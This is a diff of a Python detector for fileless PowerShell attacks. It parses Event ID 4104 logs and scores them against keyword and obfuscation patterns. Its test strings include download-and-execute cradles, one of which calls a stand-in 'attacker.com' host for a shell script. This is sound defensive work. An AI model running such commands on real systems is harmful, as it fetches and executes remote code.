@@ -1,21 +1,25 @@
 """
 fileless_detector.py
 ────────────────────
-PowerShell 메모리 기반 공격 탐지 모듈
-- Event ID 4104: PowerShell Script Block Logging
-- Event ID 4688: Process Creation (파라미터 로깅)
-- 의심 키워드/패턴 분석
-- 난독화(Obfuscation) 감지
+PowerShell Script Block Logging(Event ID 4104) 기반 Fileless 행위 탐지 모듈
+
+핵심 기능
+- Event ID 4104에서 마지막 RecordId 이후의 새 로그만 수집
+- 키워드, 인코딩, Base64, 난독화, 숨김/우회 실행 행위 분석
+- 위험한 4104만 EDR 수집기로 전달
+- RecordId / ProcessId를 함께 전달하여 Sysmon 1/3/5/22와 연계 가능
 """
 
-import subprocess
+import base64
 import json
 import re
-from datetime import datetime, timedelta
-from typing import List, Dict, Optional
-import base64
+import subprocess
+from typing import Dict, List
 
-import psutil
+try:
+    import psutil
+except ImportError:
+    psutil = None
 
 try:
     import win32gui
@@ -24,6 +28,10 @@ except ImportError:
     win32gui = None
     win32process = None
 
+
+POWERSHELL_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
+
+
 # ======================================================================
 # 1. 의심 PowerShell 패턴 정의
 # ======================================================================
@@ -31,218 +39,348 @@ except ImportError:
 SUSPICIOUS_KEYWORDS = {
     "DownloadString": {"risk": "H", "desc": "원격 파일 다운로드"},
     "DownloadFile": {"risk": "H", "desc": "원격 파일 다운로드"},
-    "IEX": {"risk": "H", "desc": "동적 코드 실행 (Invoke-Expression)"},
+    "IEX": {"risk": "H", "desc": "동적 코드 실행 (Invoke-Expression 별칭)"},
     "Invoke-Expression": {"risk": "H", "desc": "동적 코드 실행"},
-    "New-Object": {"risk": "M", "desc": "COM 객체 생성"},
+    "Invoke-WebRequest": {"risk": "M", "desc": "웹 요청 수행"},
+    "Invoke-RestMethod": {"risk": "M", "desc": "REST 요청 수행"},
+    "New-Object": {"risk": "M", "desc": "객체 생성"},
     "WScript.Shell": {"risk": "H", "desc": "Windows 스크립트 호스트 호출"},
     "System.Net.WebClient": {"risk": "H", "desc": "원격 연결 시도"},
-    "-NoProfile": {"risk": "M", "desc": "프로필 우회 (숨김 목적)"},
+    "-NoProfile": {"risk": "M", "desc": "PowerShell 프로필 우회"},
     "-Hidden": {"risk": "M", "desc": "숨겨진 실행"},
     "-NoExit": {"risk": "M", "desc": "종료 방지"},
     "-WindowStyle": {"risk": "M", "desc": "윈도우 스타일 조작"},
+    "-ExecutionPolicy Bypass": {"risk": "H", "desc": "실행 정책 우회"},
     "cmd /c": {"risk": "M", "desc": "명령 프롬프트 체이닝"},
     "-EncodedCommand": {"risk": "H", "desc": "인코딩된 명령"},
     "FromBase64String": {"risk": "H", "desc": "Base64 디코딩"},
     "Reflection": {"risk": "H", "desc": "리플렉션을 통한 메모리 접근"},
-    "[Byte]": {"risk": "M", "desc": "바이트 배열 (난독화 가능성)"},
-    "ToString": {"risk": "M", "desc": "String 변환 (난독화 가능성)"},
-    "Replace": {"risk": "M", "desc": "문자열 대체 (난독화)"},
+    "Assembly]::Load": {"risk": "H", "desc": "메모리 내 .NET 어셈블리 로드"},
+    "[Byte]": {"risk": "M", "desc": "바이트 배열 사용"},
+    "ToString": {"risk": "M", "desc": "문자열 변환"},
+    "Replace": {"risk": "M", "desc": "문자열 대체/난독화 가능성"},
     "$env": {"risk": "L", "desc": "환경 변수 접근"},
 }
 
+
 OBFUSCATION_PATTERNS = {
-    "powershell.*-e[ncodedcommand]*": "인코딩된 명령어",
-    r"\[system\.text\.encoding\].*::": "텍스트 인코딩 사용",
-    r"\$\{.*\}": "변수 보간 (난독화)",
-    r"['\"].*\$\(.*\)\$\{.*\}": "복잡한 문자열 조합",
-    r"\.\s*\(": "메서드 체이닝",
+    r"powershell(?:\.exe)?\s+.*-(?:e|en|enc|enco|encodedcommand)\s+": "인코딩된 PowerShell 명령",
+    r"\[system\.text\.encoding\].*::": "텍스트 인코딩 API 사용",
+    r"\[convert\]::frombase64string": "Base64 디코딩 API 사용",
+    r"\$\{[^}]+\}": "변수 보간/분할 사용",
+    r"['\"]\s*\+\s*['\"]": "문자열 분할 결합",
+    r"\-join\s+": "문자열 Join 난독화",
+    r"\[char\]\s*\d+": "문자 코드 기반 문자열 구성",
 }
 
+
 # ======================================================================
-# 2. PowerShell Event 수집 (Event ID 4104)
+# 2. PowerShell Event ID 4104 수집
 # ======================================================================
 
-def collect_powershell_events(hours: int = 1) -> List[Dict]:
+
+def collect_powershell_events(
+    last_record_id: int = 0,
+    max_records: int = 500,
+) -> List[Dict]:
     """
-    최근 N시간의 PowerShell Script Block Logging 이벤트 수집 (Event ID 4104)
-    
-    Args:
-        hours: 조회 시간 범위 (기본 1시간)
-    
-    Returns:
-        PowerShell 이벤트 리스트
+    마지막으로 처리한 EventRecordID보다 큰 Event ID 4104만 오래된 순으로 수집한다.
     """
+
     try:
-        # 최근 시간 계산
-        time_ago = datetime.now() - timedelta(hours=hours)
-        time_str = time_ago.strftime("%Y-%m-%dT%H:%M:%S")
-        
-        # PowerShell 이벤트 로그 조회 (Event ID 4104)
-        ps_command = (
-            f"Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' "
-            f"-FilterXPath \"*[System[EventID=4104] and System[TimeCreated[@SystemTime>='{time_str}']]]\" "
-            f"-ErrorAction SilentlyContinue | "
-            f"Select-Object @{{"
-            f"Name='EventID'; Expression={{$_.ID}}}}, "
-            f"@{{Name='TimeCreated'; Expression={{$_.TimeCreated}}}}, "
-            f"@{{Name='ComputerName'; Expression={{$_.MachineName}}}}, "
-            f"@{{Name='Message'; Expression={{$_.Message}}}} | "
-            f"ConvertTo-Json"
-        )
-        
+        last_record_id = int(last_record_id or 0)
+    except Exception:
+        last_record_id = 0
+
+    try:
+        max_records = max(1, int(max_records or 500))
+    except Exception:
+        max_records = 500
+
+    ps_script = r"""
+$xpath = "*[System[
+    (EventID=4104)
+    and
+    (EventRecordID > %d)
+]]"
+
+$events = Get-WinEvent `
+    -LogName '%s' `
+    -FilterXPath $xpath `
+    -Oldest `
+    -MaxEvents %d `
+    -ErrorAction SilentlyContinue
+
+$result = @()
+foreach ($e in $events) {
+    $result += [PSCustomObject]@{
+        EventID      = $e.Id
+        RecordId     = $e.RecordId
+        TimeCreated  = $e.TimeCreated.ToString("yyyy-MM-dd HH:mm:ss")
+        ComputerName = $e.MachineName
+        ProcessId    = $e.ProcessId
+        Message      = $e.Message
+    }
+}
+
+$result | ConvertTo-Json -Depth 5
+""" % (
+        last_record_id,
+        POWERSHELL_CHANNEL,
+        max_records,
+    )
+
+    try:
         result = subprocess.run(
-            ["powershell", "-NoProfile", "-Command", ps_command],
+            ["powershell", "-NoProfile", "-Command", ps_script],
             capture_output=True,
             text=True,
+            encoding="utf-8",
+            errors="replace",
             timeout=30,
-            creationflags=subprocess.CREATE_NO_WINDOW,
+            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
         )
-        
-        if result.returncode == 0 and result.stdout.strip():
-            try:
-                events = json.loads(result.stdout)
-                if not isinstance(events, list):
-                    events = [events]
-                return events
-            except json.JSONDecodeError:
-                return []
-        
-        return []
-    
+
+        if result.returncode != 0:
+            if result.stderr.strip():
+                print("[Fileless] PowerShell 이벤트 조회 오류:", result.stderr.strip())
+            return []
+
+        output = result.stdout.strip()
+        if not output:
+            return []
+
+        events = json.loads(output)
+
+        if isinstance(events, dict):
+            events = [events]
+
+        if not isinstance(events, list):
+            return []
+
+        return events
+
     except Exception as e:
-        print(f"⚠️ PowerShell 이벤트 수집 오류: {e}")
+        print(f"[Fileless] PowerShell 이벤트 수집 오류: {e}")
         return []
 
 
+
+def get_latest_powershell_record_id() -> int:
+    """현재 PowerShell Operational 로그의 최신 Event ID 4104 RecordId를 반환한다."""
+
+    ps_script = r"""
+$e = Get-WinEvent `
+    -FilterHashtable @{LogName='%s'; Id=4104} `
+    -MaxEvents 1 `
+    -ErrorAction SilentlyContinue
+
+if ($null -ne $e) {
+    $e.RecordId
+}
+""" % POWERSHELL_CHANNEL
+
+    try:
+        result = subprocess.run(
+            ["powershell", "-NoProfile", "-Command", ps_script],
+            capture_output=True,
+            text=True,
+            encoding="utf-8",
+            errors="replace",
+            timeout=20,
+            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
+        )
+
+        if result.returncode != 0:
+            return 0
+
+        value = result.stdout.strip()
+        return int(value) if value else 0
+
+    except Exception:
+        return 0
+
+
 # ======================================================================
-# 3. 의심 패턴 분석
+# 3. 의심 행위 분석
 # ======================================================================
+
 
 def analyze_powershell_command(command: str) -> Dict:
-    """
-    PowerShell 명령어 분석 및 위협도 평가
-    
-    Args:
-        command: 분석할 PowerShell 명령어
-    
-    Returns:
-        {
-            'risk_level': 'H' | 'M' | 'L',
-            'risk_score': 0.0 ~ 1.0,
-            'detected_keywords': [...],
-            'obfuscation_indicators': [...],
-            'is_fileless': bool,
-            'description': 'string'
-        }
-    """
-    
+    """PowerShell ScriptBlock 내용을 분석하여 Fileless 행위 위험도를 계산한다."""
+
+    command = str(command or "")
+    cmd_lower = command.lower()
+
     risk_score = 0.0
     detected_keywords = []
     obfuscation_indicators = []
-    
-    # 케이스 인센시티브 분석
-    cmd_lower = command.lower()
-    
-    # ========================================
-    # 1단계: 의심 키워드 검출
-    # ========================================
+    behavior_categories = set()
+
+    # ----------------------------------------------------------
+    # 키워드 기반 행위
+    # ----------------------------------------------------------
     for keyword, info in SUSPICIOUS_KEYWORDS.items():
-        if keyword.lower() in cmd_lower:
-            detected_keywords.append({
+        if keyword.lower() not in cmd_lower:
+            continue
+
+        detected_keywords.append(
+            {
                 "keyword": keyword,
                 "risk": info["risk"],
-                "description": info["desc"]
-            })
-            # 위험도에 따른 점수 가산
-            if info["risk"] == "H":
-                risk_score += 0.25
-            elif info["risk"] == "M":
-                risk_score += 0.1
-            else:  # L
-                risk_score += 0.05
-    
-    # ========================================
-    # 2단계: 난독화 패턴 검출
-    # ========================================
+                "description": info["desc"],
+            }
+        )
+
+        if info["risk"] == "H":
+            risk_score += 0.25
+        elif info["risk"] == "M":
+            risk_score += 0.10
+        else:
+            risk_score += 0.05
+
+        lowered_keyword = keyword.lower()
+
+        if lowered_keyword in {
+            "downloadstring",
+            "downloadfile",
+            "invoke-webrequest",
+            "invoke-restmethod",
+            "system.net.webclient",
+        }:
+            behavior_categories.add("Network/Download")
+
+        if lowered_keyword in {
+            "iex",
+            "invoke-expression",
+            "reflection",
+            "assembly]::load",
+        }:
+            behavior_categories.add("Memory/Dynamic Execution")
+
+        if lowered_keyword in {
+            "-encodedcommand",
+            "frombase64string",
+            "replace",
+            "[byte]",
+        }:
+            behavior_categories.add("Obfuscation/Encoding")
+
+        if lowered_keyword in {
+            "-noprofile",
+            "-hidden",
+            "-windowstyle",
+            "-executionpolicy bypass",
+        }:
+            behavior_categories.add("Hidden/Bypass Execution")
+
+    # ----------------------------------------------------------
+    # 난독화 패턴
+    # ----------------------------------------------------------
     for pattern, description in OBFUSCATION_PATTERNS.items():
-        if re.search(pattern, cmd_lower, re.IGNORECASE):
-            obfuscation_indicators.append(description)
-            risk_score += 0.15
-    
-    # ========================================
-    # 3단계: 인코딩 명령어 검출 (Base64)
-    # ========================================
-    if "-encodedcommand" in cmd_lower or "-e " in cmd_lower or "-ec " in cmd_lower:
         try:
-            # -EncodedCommand 이후 값 추출 시도
-            match = re.search(r'-e(?:ncodedcommand)?\s+([A-Za-z0-9+/=]+)', cmd_lower)
-            if match:
-                encoded = match.group(1)
-                # Base64 패딩 추가
-                padding = 4 - len(encoded) % 4
-                if padding != 4:
-                    encoded += '=' * padding
-                
-                try:
-                    decoded = base64.b64decode(encoded).decode('utf-16-le', errors='ignore')
-                    obfuscation_indicators.append(f"Base64 인코딩됨: {decoded[:100]}")
-                    risk_score += 0.20
-                except:
-                    obfuscation_indicators.append("Base64 인코딩됨 (디코딩 불가)")
-                    risk_score += 0.15
-        except:
-            pass
-    
-    # ========================================
-    # 4단계: 복합 위협 패턴
-    # ========================================
-    # 원격 다운로드 + 실행 조합
-    if (("downloadstring" in cmd_lower or "downloadfile" in cmd_lower) and 
-        ("iex" in cmd_lower or "invoke-expression" in cmd_lower)):
-        obfuscation_indicators.append("다운로드+실행 체인 (악성 가능성 높음)")
+            matched = re.search(pattern, command, re.IGNORECASE)
+        except re.error:
+            matched = None
+
+        if matched:
+            obfuscation_indicators.append(description)
+            behavior_categories.add("Obfuscation/Encoding")
+            risk_score += 0.15
+
+    # ----------------------------------------------------------
+    # EncodedCommand Base64 내용 확인
+    # ----------------------------------------------------------
+    encoded_match = re.search(
+        r"-(?:e|en|enc|enco|encodedcommand)\s+([A-Za-z0-9+/=]{8,})",
+        command,
+        re.IGNORECASE,
+    )
+
+    if encoded_match:
+        encoded = encoded_match.group(1)
+        try:
+            encoded += "=" * ((4 - len(encoded) % 4) % 4)
+            decoded = base64.b64decode(encoded).decode("utf-16-le", errors="ignore")
+            obfuscation_indicators.append(
+                "EncodedCommand Base64 사용: " + decoded[:120]
+            )
+            behavior_categories.add("Obfuscation/Encoding")
+            risk_score += 0.20
+        except Exception:
+            obfuscation_indicators.append("EncodedCommand Base64 사용")
+            behavior_categories.add("Obfuscation/Encoding")
+            risk_score += 0.15
+
+    # ----------------------------------------------------------
+    # 복합 행위 보너스
+    # ----------------------------------------------------------
+    has_download = any(
+        value in cmd_lower
+        for value in (
+            "downloadstring",
+            "downloadfile",
+            "invoke-webrequest",
+            "invoke-restmethod",
+            "system.net.webclient",
+        )
+    )
+
+    has_dynamic_execution = any(
+        value in cmd_lower
+        for value in (
+            "invoke-expression",
+            "iex ",
+            "iex(",
+            "assembly]::load",
+            "reflection",
+        )
+    )
+
+    if has_download and has_dynamic_execution:
+        obfuscation_indicators.append("다운로드 후 동적 실행 체인")
         risk_score += 0.25
-    
-    # 스크립트 블록 우회 (숨김 + 프로필 우회)
-    if ("-noprofile" in cmd_lower or "-hidden" in cmd_lower or 
-        "-windowstyle hidden" in cmd_lower):
-        obfuscation_indicators.append("숨겨진 실행 시도")
-        risk_score += 0.15
-    
-    # 정규화
+
+    if len(behavior_categories) >= 2:
+        risk_score += 0.10
+
+    if len(behavior_categories) >= 3:
+        risk_score += 0.10
+
     risk_score = min(risk_score, 1.0)
-    
-    # 위험도 단계 결정
-    if risk_score >= 0.7:
+
+    if risk_score >= 0.70:
         risk_level = "H"
-    elif risk_score >= 0.4:
+    elif risk_score >= 0.40:
         risk_level = "M"
     else:
         risk_level = "L"
-    
-    # Fileless 공격 판정
-    is_fileless = risk_score >= 0.4 and (
-        len(detected_keywords) > 0 or len(obfuscation_indicators) > 0
+
+    is_fileless = risk_score >= 0.40 and bool(
+        detected_keywords or obfuscation_indicators
     )
-    
+
     return {
         "risk_level": risk_level,
         "risk_score": round(risk_score, 2),
         "detected_keywords": detected_keywords,
         "obfuscation_indicators": obfuscation_indicators,
+        "behavior_categories": sorted(behavior_categories),
         "is_fileless": is_fileless,
-        "description": f"PowerShell 의심 명령: {len(detected_keywords)}개 키워드, {len(obfuscation_indicators)}개 난독화 패턴"
+        "description": (
+            f"PowerShell 의심 행위: 키워드 {len(detected_keywords)}개, "
+            f"난독화/인코딩 {len(obfuscation_indicators)}개, "
+            f"행위 유형 {len(behavior_categories)}개"
+        ),
     }
 
 
 # ======================================================================
-# 4. 백그라운드 PowerShell 탐지
+# 4. 백그라운드 PowerShell 보조 탐지
 # ======================================================================
 
+
 def _get_visible_window_pids() -> set:
-    """
-    화면에 실제로 표시되는 창을 가진 프로세스 PID 목록을 반환한다.
-    새 PowerShell 프로세스를 실행하지 않고 Win32 API로 직접 확인한다.
-    """
     visible_pids = set()
 
     if win32gui is None or win32process is None:
@@ -254,13 +392,11 @@ def _get_visible_window_pids() -> set:
                 return
 
             window_title = win32gui.GetWindowText(hwnd).strip()
-
             if not window_title:
                 return
 
             _, pid = win32process.GetWindowThreadProcessId(hwnd)
             visible_pids.add(pid)
-
         except Exception:
             pass
 
@@ -272,143 +408,151 @@ def _get_visible_window_pids() -> set:
     return visible_pids
 
 
+
 def detect_background_powershell() -> List[Dict]:
     """
-    새 PowerShell을 실행하지 않고 현재 실행 중인
-    powershell.exe 및 pwsh.exe를 직접 조회한다.
+    화면에 표시되지 않은 powershell.exe / pwsh.exe를 조회한다.
+    실시간 4104 통합 수집에는 반복 오탐 방지를 위해 자동 합산하지 않고 보조 기능으로만 둔다.
     """
+
+    if psutil is None:
+        return []
+
     detected_processes = []
 
     try:
         visible_window_pids = _get_visible_window_pids()
 
-        for proc in psutil.process_iter(
-            ["pid", "name", "cmdline"]
-        ):
+        for proc in psutil.process_iter(["pid", "name", "cmdline"]):
             try:
                 pid = proc.info.get("pid")
-                process_name = (
-                    proc.info.get("name") or ""
-                ).lower()
+                process_name = (proc.info.get("name") or "").lower()
 
-                if process_name not in {
-                    "powershell.exe",
-                    "pwsh.exe"
-                }:
+                if process_name not in {"powershell.exe", "pwsh.exe"}:
                     continue
 
-                # 화면에 표시되는 정상 PowerShell 창은 제외
                 if pid in visible_window_pids:
                     continue
 
-                command_line = " ".join(
-                    proc.info.get("cmdline") or []
+                command_line = " ".join(proc.info.get("cmdline") or [])
+
+                detected_processes.append(
+                    {
+                        "ProcessID": pid,
+                        "ProcessName": process_name,
+                        "CommandLine": command_line,
+                    }
                 )
 
-                detected_processes.append({
-                    "ProcessID": pid,
-                    "ProcessName": process_name,
-                    "CommandLine": command_line
-                })
-
-            except (
-                psutil.NoSuchProcess,
-                psutil.AccessDenied,
-                psutil.ZombieProcess
-            ):
+            except Exception:
                 continue
 
-        return detected_processes
-
     except Exception as e:
-        print(f"⚠️ 백그라운드 PowerShell 탐지 오류: {e}")
-        return []
+        print(f"[Fileless] 백그라운드 PowerShell 탐지 오류: {e}")
+
+    return detected_processes
 
 
 # ======================================================================
 # 5. 통합 Fileless 탐지
 # ======================================================================
 
-def detect_fileless_threats(hours: int = 1) -> List[Dict]:
+
+def detect_fileless_threats(
+    last_record_id: int = 0,
+    max_records: int = 500,
+    return_meta: bool = False,
+):
     """
-    Fileless 공격 종합 탐지
-    
-    Returns:
-        위협 정보 리스트
+    마지막 RecordId 이후 새로 발생한 Event ID 4104를 분석한다.
+
+    return_meta=True:
+        (위험 로그 목록, 이번에 확인한 마지막 4104 RecordId)
     """
+
     threats = []
-    
-    # PowerShell 스크립트 블록 이벤트 수집
-    ps_events = collect_powershell_events(hours)
-    
+    ps_events = collect_powershell_events(
+        last_record_id=last_record_id,
+        max_records=max_records,
+    )
+
+    try:
+        last_seen_record_id = int(last_record_id or 0)
+    except Exception:
+        last_seen_record_id = 0
+
     for event in ps_events:
-        message = event.get("Message", "")
-        
+        try:
+            record_id = int(event.get("RecordId", 0) or 0)
+        except Exception:
+            record_id = 0
+
+        if record_id > last_seen_record_id:
+            last_seen_record_id = record_id
+
+        message = str(event.get("Message", "") or "")
+
+        # 수집기가 자체적으로 실행한 Get-WinEvent 스크립트는 분석 대상에서 제외한다.
+        message_lower = message.lower()
+        if (
+            "get-winevent" in message_lower
+            and "microsoft-windows-powershell/operational" in message_lower
+            and "eventid=4104" in message_lower.replace(" ", "")
+        ):
+            continue
+
         analysis = analyze_powershell_command(message)
-        
-        if analysis["is_fileless"]:
-            threat = {
-                "threat_type": "Fileless.PowerShell",
-                "event_id": 4104,
-                "timestamp": event.get("TimeCreated"),
-                "computer_name": event.get("ComputerName"),
-                "risk_level": analysis["risk_level"],
-                "risk_score": analysis["risk_score"],
-                "command_snippet": message[:200],  # 처음 200자
-                "keywords_detected": analysis["detected_keywords"],
-                "obfuscation_flags": analysis["obfuscation_indicators"],
-                "description": analysis["description"],
-                "mitre_tactic": "Defense Evasion / Execution",
-                "mitre_technique": "T1140 (Deobfuscate/Decode Files or Information)",
-            }
-            threats.append(threat)
-    
-    # 백그라운드 PowerShell 프로세스 탐지
-    bg_processes = detect_background_powershell()
-    
-    for proc in bg_processes:
+
+        if not analysis["is_fileless"]:
+            continue
+
         threat = {
-            "threat_type": "Fileless.BackgroundProcess",
-            "event_id": 1,  # 프로세스 생성
-            "timestamp": datetime.now().isoformat(),
-            "computer_name": "LOCAL",
-            "risk_level": "M",
-            "risk_score": 0.6,
-            "process_id": proc.get("ProcessID"),
-            "process_name": proc.get("ProcessName"),
-            "command_line": proc.get("CommandLine"),
-            "description": "백그라운드 PowerShell 프로세스 (숨겨진 실행)",
+            "threat_type": "Fileless.PowerShell",
+            "event_id": 4104,
+            "record_id": record_id,
+            "process_id": event.get("ProcessId", ""),
+            "timestamp": event.get("TimeCreated"),
+            "computer_name": event.get("ComputerName"),
+            "risk_level": analysis["risk_level"],
+            "risk_score": analysis["risk_score"],
+            "command_snippet": message[:1000],
+            "keywords_detected": analysis["detected_keywords"],
+            "obfuscation_flags": analysis["obfuscation_indicators"],
+            "behavior_categories": analysis["behavior_categories"],
+            "description": analysis["description"],
             "mitre_tactic": "Execution / Defense Evasion",
-            "mitre_technique": "T1086 (PowerShell)",
+            "mitre_technique": "T1059.001 PowerShell",
         }
+
         threats.append(threat)
-    
+
+    if return_meta:
+        return threats, last_seen_record_id
+
     return threats
 
 
 # ======================================================================
-# 6. 테스트 함수
+# 6. 단독 테스트
 # ======================================================================
+
 
 if __name__ == "__main__":
     print("=" * 70)
-    print("🔍 Fileless 공격 탐지 테스트")
+    print("Fileless PowerShell 행위 분석 테스트")
     print("=" * 70)
-    
-    # 테스트 명령어
+
     test_commands = [
-        "powershell.exe -NoProfile -Hidden -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')",
-        "powershell.exe -e JABhID0AJAhaAy8-=",
         "Get-Process",
-        "New-Item -Path C:\\test.txt",
-        "powershell.exe -WindowStyle Hidden cmd /c \"dir\"",
+        "Invoke-Expression 'Write-Output TEST'",
+        "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VEVTVA==')) | Invoke-Expression",
+        "powershell.exe -EncodedCommand JABhAD0AMQA=",
+        "(New-Object Net.WebClient).DownloadString('https://example.com/test.ps1') | IEX",
     ]
-    
-    print("\n📋 명령어 분석 결과:\n")
+
     for cmd in test_commands:
-        analysis = analyze_powershell_command(cmd)
-        print(f"[{analysis['risk_level']}] {cmd[:60]}")
-        print(f"   점수: {analysis['risk_score']}, Fileless: {analysis['is_fileless']}")
-        if analysis['detected_keywords']:
-            print(f"   키워드: {', '.join([k['keyword'] for k in analysis['detected_keywords']])}")
-        print()
+        result = analyze_powershell_command(cmd)
+        print("\nCommand:", cmd)
+        print("Risk:", result["risk_level"], result["risk_score"])
+        print("Fileless:", result["is_fileless"])
+        print("Behaviors:", result["behavior_categories"])
